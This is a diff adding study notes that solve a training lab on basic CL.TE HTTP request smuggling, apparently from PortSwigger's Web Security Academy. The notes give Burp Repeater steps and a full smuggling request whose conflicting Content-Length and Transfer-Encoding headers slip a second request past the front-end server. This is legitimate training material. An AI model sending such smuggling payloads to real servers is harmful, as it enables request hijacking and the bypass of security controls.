@@ -21,4 +21,19 @@ TIP:- Use HTTP Rquest Smuggler extension.
 
 #1 Lab: HTTP request smuggling, basic CL.TE vulnerability
 
-     1. send request to
+     1. Send request to repeater and change  to HTTP 1.1 using inspector
+     2. Chang request method to POST 
+     3. POST / HTTP/1.1
+        Host: 0a9e00a3034a32ae82e7e289004200b2.web-security-academy.net
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /throws404 HTTP/1.1
+        X-Ignore: X
+
+     4. Send the requst and after it send the normal request and lab is solved.
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
